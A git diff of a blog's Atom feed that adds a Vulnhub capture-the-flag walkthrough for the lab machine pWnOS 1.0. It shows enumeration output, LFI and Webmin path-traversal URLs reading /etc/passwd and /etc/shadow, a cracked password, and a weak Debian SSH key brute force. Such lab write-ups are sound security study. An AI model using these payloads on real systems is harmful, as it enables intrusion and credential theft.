@@ -4,7 +4,7 @@
   <title><![CDATA[Category: Vulnhub | 0x41414141]]></title>
   <link href="http://73696e65.github.io/blog/categories/vulnhub/atom.xml" rel="self"/>
   <link href="http://73696e65.github.io/"/>
-  <updated>2015-05-10T12:10:23+02:00</updated>
+  <updated>2015-05-10T13:00:36+02:00</updated>
   <id>http://73696e65.github.io/</id>
   <author>
     <name><![CDATA[Norbert Szetei]]></name>
@@ -12,6 +12,323 @@
   </author>
   <generator uri="http://octopress.org/">Octopress</generator>
 
+  
+  <entry>
+    <title type="html"><![CDATA[pWnOS: 1.0]]></title>
+    <link href="http://73696e65.github.io/blog/2015/05/10/pwnos-1-dot-0/"/>
+    <updated>2015-05-10T12:13:34+02:00</updated>
+    <id>http://73696e65.github.io/blog/2015/05/10/pwnos-1-dot-0</id>
+    <content type="html"><![CDATA[<p>Image: <a href="https://www.vulnhub.com/entry/pwnos-10,33/">pWnOS: 1.0</a></p>
+
+<p>Nmap output:
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>PORT      STATE SERVICE     VERSION
+</span><span class='line'>22/tcp    open  ssh         OpenSSH 4.6p1 Debian 5build1 (protocol 2.0)
+</span><span class='line'>80/tcp    open  http        Apache httpd 2.2.4 ((Ubuntu) PHP/5.2.3-1ubuntu6)
+</span><span class='line'>139/tcp   open  netbios-ssn Samba smbd 3.X (workgroup: MSHOME)
+</span><span class='line'>445/tcp   open  netbios-ssn Samba smbd 3.X (workgroup: MSHOME)
+</span><span class='line'>10000/tcp open  http        MiniServ 0.01 (Webmin httpd)
+</span><span class='line'>Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel</span></code></pre></td></tr></table></div></figure></p>
+
+<p>After a while of browsing the web page, we found trivial LFI vulnerability:
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+<span class='line-number'>10</span>
+<span class='line-number'>11</span>
+<span class='line-number'>12</span>
+<span class='line-number'>13</span>
+<span class='line-number'>14</span>
+<span class='line-number'>15</span>
+<span class='line-number'>16</span>
+<span class='line-number'>17</span>
+<span class='line-number'>18</span>
+<span class='line-number'>19</span>
+<span class='line-number'>20</span>
+<span class='line-number'>21</span>
+<span class='line-number'>22</span>
+<span class='line-number'>23</span>
+<span class='line-number'>24</span>
+<span class='line-number'>25</span>
+<span class='line-number'>26</span>
+<span class='line-number'>27</span>
+<span class='line-number'>28</span>
+<span class='line-number'>29</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>&lt;a href="http://193.168.0.25/index1.php?help=true&amp;connect=../../../../etc/passwd">http://193.168.0.25/index1.php?help=true&amp;connect=../../../../etc/passwd&lt;/a>&lt;/p>
+</span><span class='line'>
+</span><span class='line'>&lt;p>root:x:0:0:root:/root:/bin/bash
+</span><span class='line'>daemon:x:1:1:daemon:/usr/sbin:/bin/sh
+</span><span class='line'>bin:x:2:2:bin:/bin:/bin/sh
+</span><span class='line'>sys:x:3:3:sys:/dev:/bin/sh
+</span><span class='line'>sync:x:4:65534:sync:/bin:/bin/sync
+</span><span class='line'>games:x:5:60:games:/usr/games:/bin/sh
+</span><span class='line'>man:x:6:12:man:/var/cache/man:/bin/sh
+</span><span class='line'>lp:x:7:7:lp:/var/spool/lpd:/bin/sh
+</span><span class='line'>mail:x:8:8:mail:/var/mail:/bin/sh
+</span><span class='line'>&lt;a href="news:x:9:9:news:/var/spool/news:/bin/sh">news:x:9:9:news:/var/spool/news:/bin/sh&lt;/a>
+</span><span class='line'>uucp:x:10:10:uucp:/var/spool/uucp:/bin/sh
+</span><span class='line'>proxy:x:13:13:proxy:/bin:/bin/sh
+</span><span class='line'>www-data:x:33:33:www-data:/var/www:/bin/sh
+</span><span class='line'>backup:x:34:34:backup:/var/backups:/bin/sh
+</span><span class='line'>list:x:38:38:Mailing List Manager:/var/list:/bin/sh
+</span><span class='line'>irc:x:39:39:ircd:/var/run/ircd:/bin/sh
+</span><span class='line'>gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/bin/sh
+</span><span class='line'>nobody:x:65534:65534:nobody:/nonexistent:/bin/sh
+</span><span class='line'>dhcp:x:100:101::/nonexistent:/bin/false
+</span><span class='line'>syslog:x:101:102::/home/syslog:/bin/false
+</span><span class='line'>klog:x:102:103::/home/klog:/bin/false
+</span><span class='line'>mysql:x:103:107:MySQL Server,,,:/var/lib/mysql:/bin/false
+</span><span class='line'>sshd:x:104:65534::/var/run/sshd:/usr/sbin/nologin
+</span><span class='line'>vmware:x:1000:1000:vmware,,,:/home/vmware:/bin/bash
+</span><span class='line'>obama:x:1001:1001::/home/obama:/bin/bash
+</span><span class='line'>osama:x:1002:1002::/home/osama:/bin/bash
+</span><span class='line'>yomama:x:1003:1003::/home/yomama:/bin/bash</span></code></pre></td></tr></table></div></figure></p>
+
+<p>We can find a lot of information querying the samba service too:
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+<span class='line-number'>10</span>
+<span class='line-number'>11</span>
+<span class='line-number'>12</span>
+<span class='line-number'>13</span>
+<span class='line-number'>14</span>
+<span class='line-number'>15</span>
+<span class='line-number'>16</span>
+<span class='line-number'>17</span>
+<span class='line-number'>18</span>
+<span class='line-number'>19</span>
+<span class='line-number'>20</span>
+<span class='line-number'>21</span>
+<span class='line-number'>22</span>
+<span class='line-number'>23</span>
+<span class='line-number'>24</span>
+<span class='line-number'>25</span>
+<span class='line-number'>26</span>
+<span class='line-number'>27</span>
+<span class='line-number'>28</span>
+<span class='line-number'>29</span>
+<span class='line-number'>30</span>
+<span class='line-number'>31</span>
+<span class='line-number'>32</span>
+<span class='line-number'>33</span>
+<span class='line-number'>34</span>
+<span class='line-number'>35</span>
+<span class='line-number'>36</span>
+<span class='line-number'>37</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>root@kali:~/vulnhub/pwnos# nmblookup -A 192.168.0.25
+</span><span class='line'>Looking up status of 192.168.0.25
+</span><span class='line'>        UBUNTUVM        &lt;00> -         H &lt;ACTIVE>
+</span><span class='line'>        UBUNTUVM        &lt;03> -         H &lt;ACTIVE>
+</span><span class='line'>        UBUNTUVM        &lt;20> -         H &lt;ACTIVE>
+</span><span class='line'>        ..&lt;strong>MSBROWSE&lt;/strong>. &lt;01> - &lt;GROUP> H &lt;ACTIVE>
+</span><span class='line'>        MSHOME          &lt;1d> -         H &lt;ACTIVE>
+</span><span class='line'>        MSHOME          &lt;1e> - &lt;GROUP> H &lt;ACTIVE>
+</span><span class='line'>        MSHOME          &lt;00> - &lt;GROUP> H &lt;ACTIVE>&lt;/p>
+</span><span class='line'>
+</span><span class='line'>&lt;pre>&lt;code>    MAC Address = 00-00-00-00-00-00
+</span><span class='line'>&lt;/code>&lt;/pre>
+</span><span class='line'>
+</span><span class='line'>&lt;p>root@kali:~/vulnhub/pwnos# smbclient -L\UBUNTUVM -I 192.168.0.25 -N
+</span><span class='line'>Anonymous login successful
+</span><span class='line'>Domain=[MSHOME] OS=[Unix] Server=[Samba 3.0.26a]&lt;/p>
+</span><span class='line'>
+</span><span class='line'>&lt;pre>&lt;code>    Sharename       Type      Comment
+</span><span class='line'>    ---------       ----      -------
+</span><span class='line'>    home            Disk      Home Directory for vmware User
+</span><span class='line'>    print$          Disk      Printer Drivers
+</span><span class='line'>    IPC$            IPC       IPC Service (ubuntuvm)
+</span><span class='line'>&lt;/code>&lt;/pre>
+</span><span class='line'>
+</span><span class='line'>&lt;p>Anonymous login successful
+</span><span class='line'>Domain=[MSHOME] OS=[Unix] Server=[Samba 3.0.26a]&lt;/p>
+</span><span class='line'>
+</span><span class='line'>&lt;pre>&lt;code>    Server               Comment
+</span><span class='line'>    ---------            -------
+</span><span class='line'>    UBUNTUVM             ubuntuvm
+</span><span class='line'>
+</span><span class='line'>    Workgroup            Master
+</span><span class='line'>    ---------            -------
+</span><span class='line'>    MSHOME               UBUNTUVM
+</span><span class='line'>&lt;/code>&lt;/pre>
+</span><span class='line'>
+</span><span class='line'>&lt;p></span></code></pre></td></tr></table></div></figure></p>
+
+<p>There are a few enumeration modules in metasploit:
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+<span class='line-number'>10</span>
+<span class='line-number'>11</span>
+<span class='line-number'>12</span>
+<span class='line-number'>13</span>
+<span class='line-number'>14</span>
+<span class='line-number'>15</span>
+<span class='line-number'>16</span>
+<span class='line-number'>17</span>
+<span class='line-number'>18</span>
+<span class='line-number'>19</span>
+<span class='line-number'>20</span>
+<span class='line-number'>21</span>
+<span class='line-number'>22</span>
+<span class='line-number'>23</span>
+<span class='line-number'>24</span>
+<span class='line-number'>25</span>
+<span class='line-number'>26</span>
+<span class='line-number'>27</span>
+<span class='line-number'>28</span>
+<span class='line-number'>29</span>
+<span class='line-number'>30</span>
+<span class='line-number'>31</span>
+<span class='line-number'>32</span>
+<span class='line-number'>33</span>
+<span class='line-number'>34</span>
+<span class='line-number'>35</span>
+<span class='line-number'>36</span>
+<span class='line-number'>37</span>
+<span class='line-number'>38</span>
+<span class='line-number'>39</span>
+<span class='line-number'>40</span>
+<span class='line-number'>41</span>
+<span class='line-number'>42</span>
+<span class='line-number'>43</span>
+<span class='line-number'>44</span>
+<span class='line-number'>45</span>
+<span class='line-number'>46</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>msf exploit(usermap_script) > use auxiliary/scanner/smb/pipe_auditor
+</span><span class='line'>msf auxiliary(pipe_auditor) > setg RHOSTS 192.168.0.25
+</span><span class='line'>RHOSTS => 192.168.0.25
+</span><span class='line'>msf auxiliary(pipe_auditor) > exploit&lt;/p>
+</span><span class='line'>
+</span><span class='line'>&lt;p>[&lt;em>] 192.168.0.25 - Pipes: \netlogon, \lsarpc, \samr, \eventlog, \InitShutdown, \lsass, \ntsvcs, \srvsvc, \wkssvc
+</span><span class='line'>[&lt;/em>] Scanned 1 of 1 hosts (100% complete)
+</span><span class='line'>[*] Auxiliary module execution completed&lt;/p>
+</span><span class='line'>
+</span><span class='line'>&lt;p>msf auxiliary(smb_enumshares) > use auxiliary/scanner/smb/smb_enumusers
+</span><span class='line'>msf auxiliary(smb_enumusers) > exploit&lt;/p>
+</span><span class='line'>
+</span><span class='line'>&lt;p>[*] 192.168.0.25 UBUNTUVM [ games, nobody, proxy, syslog, www-data, root, news, bin, mail, dhcp, daemon, sshd, man, lp, mysql, gnats, backup, sys, klog, vmware, list, irc, sync, uucp ] ( LockoutTries=0 PasswordMin=5 )&lt;/p>
+</span><span class='line'>
+</span><span class='line'>&lt;p>msf auxiliary(smb_login) > use auxiliary/scanner/smb/smb_lookupsid
+</span><span class='line'>msf auxiliary(smb_lookupsid) > exploit&lt;/p>
+</span><span class='line'>
+</span><span class='line'>&lt;p>[&lt;em>] 192.168.0.25 PIPE(LSARPC) LOCAL(UBUNTUVM - 5-21-2952145021-507220021-499326276) DOMAIN(MSHOME - )
+</span><span class='line'>[&lt;/em>] 192.168.0.25 USER=nobody RID=501
+</span><span class='line'>[&lt;em>] 192.168.0.25 GROUP=None RID=513
+</span><span class='line'>[&lt;/em>] 192.168.0.25 USER=root RID=1000
+</span><span class='line'>[&lt;em>] 192.168.0.25 USER=daemon RID=1002
+</span><span class='line'>[&lt;/em>] 192.168.0.25 USER=bin RID=1004
+</span><span class='line'>[&lt;em>] 192.168.0.25 USER=sys RID=1006
+</span><span class='line'>[&lt;/em>] 192.168.0.25 USER=sync RID=1008
+</span><span class='line'>[&lt;em>] 192.168.0.25 USER=games RID=1010
+</span><span class='line'>[&lt;/em>] 192.168.0.25 USER=man RID=1012
+</span><span class='line'>[&lt;em>] 192.168.0.25 USER=lp RID=1014
+</span><span class='line'>[&lt;/em>] 192.168.0.25 USER=mail RID=1016
+</span><span class='line'>[&lt;em>] 192.168.0.25 USER=news RID=1018
+</span><span class='line'>[&lt;/em>] 192.168.0.25 USER=uucp RID=1020
+</span><span class='line'>[&lt;em>] 192.168.0.25 USER=proxy RID=1026
+</span><span class='line'>[&lt;/em>] 192.168.0.25 USER=www-data RID=1066
+</span><span class='line'>[&lt;em>] 192.168.0.25 USER=backup RID=1068
+</span><span class='line'>[&lt;/em>] 192.168.0.25 USER=list RID=1076
+</span><span class='line'>[&lt;em>] 192.168.0.25 USER=irc RID=1078
+</span><span class='line'>[&lt;/em>] 192.168.0.25 USER=gnats RID=1082
+</span><span class='line'>[&lt;em>] 192.168.0.25 USER=dhcp RID=1200
+</span><span class='line'>[&lt;/em>] 192.168.0.25 USER=syslog RID=1202
+</span><span class='line'>[&lt;em>] 192.168.0.25 USER=klog RID=1204
+</span><span class='line'>[&lt;/em>] 192.168.0.25 USER=mysql RID=1206
+</span><span class='line'>[&lt;em>] 192.168.0.25 USER=sshd RID=1208
+</span><span class='line'>[&lt;/em>] 192.168.0.25 USER=vmware RID=3000
+</span><span class='line'>[&lt;em>] 192.168.0.25 UBUNTUVM [nobody, root, daemon, bin, sys, sync, games, man, lp, mail, news, uucp, proxy, www-data, backup, list, irc, gnats, dhcp, syslog, klog, mysql, sshd, vmware ]
+</span><span class='line'>[&lt;/em>] Scanned 1 of 1 hosts (100% complete)
+</span><span class='line'>[*] Auxiliary module execution completed</span></code></pre></td></tr></table></div></figure></p>
+
+<p>The webmin is vulnerable and the exploit in metasploit:
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>Name: Webmin File Disclosure
+</span><span class='line'>     Module: auxiliary/admin/webmin/file_disclosure
+</span><span class='line'>    License: Metasploit Framework License (BSD)
+</span><span class='line'>       Rank: Normal
+</span><span class='line'>  Disclosed: 2006-06-30</span></code></pre></td></tr></table></div></figure></p>
+
+<p>Basically the exploitation could be performed on command line to disclose arbitrary file, for example:
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>&lt;a href="http://192.168.0.25:10000/unauthenticated/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/etc/shadow">http://192.168.0.25:10000/unauthenticated/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/etc/shadow&lt;/a>&lt;/p>
+</span><span class='line'>
+</span><span class='line'>&lt;p>&lt;a href="http://192.168.0.25:10000/unauthenticated/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/etc/webmin/miniserv.conf">http://192.168.0.25:10000/unauthenticated/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/etc/webmin/miniserv.conf&lt;/a>&lt;/p>
+</span><span class='line'>
+</span><span class='line'>&lt;p>&lt;a href="http://192.168.0.25:10000/unauthenticated/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/etc/webmin/miniserv.users">http://192.168.0.25:10000/unauthenticated/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/etc/webmin/miniserv.users&lt;/a>&lt;/p>
+</span><span class='line'>
+</span><span class='line'>&lt;p>&lt;a href="http://192.168.0.25:10000/unauthenticated/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/etc/webmin/miniserv.pem">http://192.168.0.25:10000/unauthenticated/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/etc/webmin/miniserv.pem&lt;/a></span></code></pre></td></tr></table></div></figure></p>
+
+<p>Using john on /etc/shadow, we obtain credentials of user vmware for successful login to the system:
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>h4ckm3           (vmware)</span></code></pre></td></tr></table></div></figure></p>
+
+<p>The box could be rooted using standard vmsplice exploit.</p>
+
+<p>However, there is another way to get user account. The script
+<a href="https://wiki.debian.org/SSLkeys#Testing_keys_using_dowkd.pl">dowkd.pl</a> ensures
+us that the OpenSSL is vulnerable
+(<a href="https://security-tracker.debian.org/tracker/CVE-2008-0166">CVE-2008-0166</a>).</p>
+
+<p>We download and unpack already generated RSA keys from offensive-security repository:
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>$ wget &lt;a href="https://github.com/offensive-security/exploit-database-bin-sploits/raw/master/sploits/debian_ssh_rsa_2048_x86.tar.bz2">https://github.com/offensive-security/exploit-database-bin-sploits/raw/master/sploits/debian_ssh_rsa_2048_x86.tar.bz2&lt;/a></span></code></pre></td></tr></table></div></figure></p>
+
+<p>Because usage of weak private keys could be blacklisted on our server, we use
+the following
+<a href="https://unix.stackexchange.com/questions/109908/public-key-f36e8704ea2db360ff42ad26671794d5-blacklisted-see-ssh">instructions</a>
+to enable them.</p>
+
+<p>Basically adding this directive to our ssh_config file should be sufficient:
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>UseBlacklistedKeys yes</span></code></pre></td></tr></table></div></figure></p>
+
+<p>In exploit-db, we use python script to try every possible private key:
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>$ python platforms/linux/remote/5720.py /tmp/rsa/2048 192.168.0.25 obama&lt;/p>
+</span><span class='line'>
+</span><span class='line'>&lt;p>Key Found in file: dcbe2a56e8cdea6d17495f6648329ee2-4679
+</span><span class='line'>Execute: ssh -lobama -p22 -i /tmp/rsa/2048/dcbe2a56e8cdea6d17495f6648329ee2-4679 192.168.0.25</span></code></pre></td></tr></table></div></figure></p>
+]]></content>
+  </entry>
   
   <entry>
     <title type="html"><![CDATA[DE-ICE-S2.100]]></title>
@@ -130,7 +447,7 @@ proper SMTP functionality.
 
 <p>Again, this could be automatized using smtp-user-enum script:
 <figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
-</pre></td><td class='code'><pre><code class=''><span class='line'>root@kali:# smtp-user-enum -M RCPT -f &lt;a href="&#x6d;&#97;&#x69;&#x6c;&#x74;&#x6f;&#x3a;&#114;&#111;&#x6f;&#116;&#64;&#x73;&#108;&#x61;&#x78;&#x2e;&#101;&#120;&#x61;&#x6d;&#112;&#x6c;&#101;&#x2e;&#110;&#101;&#116;">&#114;&#x6f;&#x6f;&#x74;&#x40;&#x73;&#x6c;&#97;&#120;&#46;&#101;&#x78;&#x61;&#x6d;&#x70;&#108;&#x65;&#46;&#x6e;&#x65;&#116;&lt;/a> -U userlist.txt -t 192.168.2.100</span></code></pre></td></tr></table></div></figure></p>
+</pre></td><td class='code'><pre><code class=''><span class='line'>root@kali:# smtp-user-enum -M RCPT -f &lt;a href="&#x6d;&#x61;&#105;&#108;&#x74;&#x6f;&#x3a;&#x72;&#111;&#x6f;&#x74;&#x40;&#115;&#108;&#97;&#x78;&#x2e;&#101;&#120;&#97;&#x6d;&#112;&#x6c;&#101;&#x2e;&#110;&#101;&#x74;">&#114;&#111;&#x6f;&#x74;&#x40;&#115;&#x6c;&#x61;&#x78;&#46;&#101;&#x78;&#x61;&#x6d;&#x70;&#x6c;&#101;&#x2e;&#x6e;&#x65;&#x74;&lt;/a> -U userlist.txt -t 192.168.2.100</span></code></pre></td></tr></table></div></figure></p>
 
 <p>Dirb found the following URLs:
 <figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
@@ -338,7 +655,7 @@ pirrip user:
 <span class='line-number'>4</span>
 </pre></td><td class='code'><pre><code class=''><span class='line'>pirrip@slax:/var/spool/mail$ cat pirrip&lt;/p>
 </span><span class='line'>
-</span><span class='line'>&lt;p>E-Mail: &lt;a href="&#x6d;&#97;&#x69;&#108;&#x74;&#x6f;&#x3a;&#x70;&#x69;&#x72;&#x72;&#105;&#112;&#x40;&#x73;&#x6c;&#97;&#x78;&#46;&#101;&#x78;&#x61;&#109;&#112;&#108;&#101;&#46;&#110;&#101;&#x74;">&#112;&#x69;&#x72;&#x72;&#x69;&#112;&#64;&#115;&#x6c;&#x61;&#x78;&#46;&#x65;&#120;&#x61;&#109;&#x70;&#x6c;&#x65;&#x2e;&#110;&#101;&#116;&lt;/a>
+</span><span class='line'>&lt;p>E-Mail: &lt;a href="&#x6d;&#97;&#x69;&#x6c;&#x74;&#x6f;&#58;&#x70;&#x69;&#114;&#x72;&#x69;&#x70;&#x40;&#x73;&#x6c;&#97;&#120;&#46;&#x65;&#120;&#97;&#109;&#112;&#x6c;&#101;&#46;&#110;&#x65;&#x74;">&#112;&#105;&#x72;&#x72;&#105;&#112;&#64;&#115;&#108;&#97;&#120;&#x2e;&#x65;&#120;&#97;&#109;&#x70;&#x6c;&#101;&#46;&#110;&#x65;&#116;&lt;/a>
 </span><span class='line'>Password: 0l1v3rTw1st</span></code></pre></td></tr></table></div></figure></p>
 
 <p><figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
@@ -372,18 +689,18 @@ pirrip user:
 <span class='line-number'>20</span>
 <span class='line-number'>21</span>
 <span class='line-number'>22</span>
-</pre></td><td class='code'><pre><code class=''><span class='line'>From &lt;a href="&#109;&#x61;&#105;&#108;&#x74;&#111;&#58;&#115;&#105;&#107;&#x65;&#x73;&#x40;&#x73;&#x6c;&#97;&#120;&#46;&#x65;&#120;&#x61;&#x6d;&#112;&#x6c;&#x65;&#x2e;&#110;&#101;&#x74;">&#x73;&#x69;&#x6b;&#101;&#x73;&#64;&#x73;&#108;&#97;&#x78;&#46;&#101;&#120;&#97;&#109;&#x70;&#x6c;&#101;&#x2e;&#110;&#x65;&#x74;&lt;/a>  Sun Jan 13 23:53:37 2008
-</span><span class='line'>Return-Path: &lt;a href="&#x6d;&#x61;&#x69;&#x6c;&#116;&#x6f;&#x3a;&#115;&#105;&#107;&#x65;&#115;&#64;&#x73;&#108;&#x61;&#x78;&#46;&#101;&#x78;&#x61;&#109;&#x70;&#x6c;&#x65;&#x2e;&#x6e;&#101;&#x74;">&#115;&#105;&#107;&#x65;&#x73;&#x40;&#x73;&#108;&#x61;&#120;&#x2e;&#x65;&#x78;&#x61;&#109;&#112;&#x6c;&#x65;&#x2e;&#x6e;&#101;&#x74;&lt;/a>
+</pre></td><td class='code'><pre><code class=''><span class='line'>From &lt;a href="&#109;&#x61;&#x69;&#108;&#x74;&#x6f;&#x3a;&#115;&#x69;&#107;&#101;&#115;&#64;&#115;&#x6c;&#97;&#120;&#x2e;&#x65;&#120;&#97;&#x6d;&#112;&#x6c;&#101;&#x2e;&#x6e;&#101;&#x74;">&#115;&#105;&#107;&#x65;&#x73;&#64;&#115;&#x6c;&#97;&#x78;&#46;&#101;&#x78;&#x61;&#109;&#x70;&#108;&#101;&#46;&#x6e;&#x65;&#116;&lt;/a>  Sun Jan 13 23:53:37 2008
+</span><span class='line'>Return-Path: &lt;a href="&#x6d;&#97;&#105;&#108;&#x74;&#111;&#58;&#x73;&#x69;&#107;&#101;&#x73;&#64;&#x73;&#108;&#97;&#120;&#46;&#x65;&#x78;&#97;&#109;&#112;&#108;&#101;&#46;&#110;&#101;&#x74;">&#115;&#105;&#107;&#101;&#115;&#x40;&#x73;&#108;&#x61;&#x78;&#46;&#x65;&#x78;&#x61;&#x6d;&#112;&#x6c;&#101;&#x2e;&#x6e;&#x65;&#116;&lt;/a>
 </span><span class='line'>Received: from slax.example.net (localhost [127.0.0.1])
 </span><span class='line'>        by slax.example.net (8.13.7/8.13.7) with ESMTP id m0DNlmHb009636
-</span><span class='line'>        for &lt;a href="&#109;&#97;&#105;&#x6c;&#116;&#x6f;&#58;&#112;&#105;&#x72;&#114;&#x69;&#112;&#64;&#115;&#108;&#97;&#x78;&#46;&#x65;&#x78;&#x61;&#109;&#x70;&#108;&#x65;&#46;&#x6e;&#x65;&#116;">&#112;&#x69;&#x72;&#x72;&#x69;&#x70;&#64;&#x73;&#x6c;&#x61;&#120;&#46;&#101;&#x78;&#97;&#109;&#x70;&#108;&#101;&#x2e;&#110;&#x65;&#116;&lt;/a>; Sun, 13 Jan 2008 23:47:48 GMT
-</span><span class='line'>Received: (from &lt;a href="&#109;&#97;&#105;&#108;&#116;&#111;&#x3a;&#x73;&#105;&#107;&#101;&#x73;&#x40;&#x73;&#108;&#x61;&#120;&#x2e;&#x65;&#120;&#x61;&#109;&#112;&#x6c;&#x65;&#x2e;&#x6e;&#101;&#x74;">&#115;&#x69;&#x6b;&#101;&#x73;&#x40;&#x73;&#x6c;&#97;&#120;&#46;&#x65;&#120;&#x61;&#109;&#x70;&#x6c;&#x65;&#x2e;&#110;&#x65;&#116;&lt;/a>)
+</span><span class='line'>        for &lt;a href="&#x6d;&#97;&#105;&#x6c;&#116;&#111;&#58;&#112;&#x69;&#114;&#114;&#x69;&#112;&#64;&#115;&#108;&#x61;&#x78;&#x2e;&#x65;&#x78;&#97;&#109;&#112;&#108;&#101;&#46;&#x6e;&#x65;&#116;">&#x70;&#x69;&#114;&#x72;&#105;&#112;&#x40;&#115;&#108;&#97;&#120;&#46;&#101;&#x78;&#97;&#109;&#x70;&#x6c;&#101;&#46;&#110;&#x65;&#116;&lt;/a>; Sun, 13 Jan 2008 23:47:48 GMT
+</span><span class='line'>Received: (from &lt;a href="&#x6d;&#x61;&#105;&#x6c;&#116;&#111;&#58;&#115;&#x69;&#x6b;&#101;&#x73;&#64;&#115;&#108;&#97;&#120;&#x2e;&#x65;&#120;&#x61;&#109;&#112;&#x6c;&#x65;&#46;&#x6e;&#x65;&#116;">&#115;&#x69;&#x6b;&#101;&#x73;&#64;&#115;&#x6c;&#x61;&#120;&#x2e;&#101;&#120;&#97;&#109;&#112;&#108;&#x65;&#46;&#x6e;&#101;&#116;&lt;/a>)
 </span><span class='line'>        by slax.example.net (8.13.7/8.13.7/Submit) id m0DNlmDI009635
 </span><span class='line'>        for pirrip; Sun, 13 Jan 2008 23:47:48 GMT
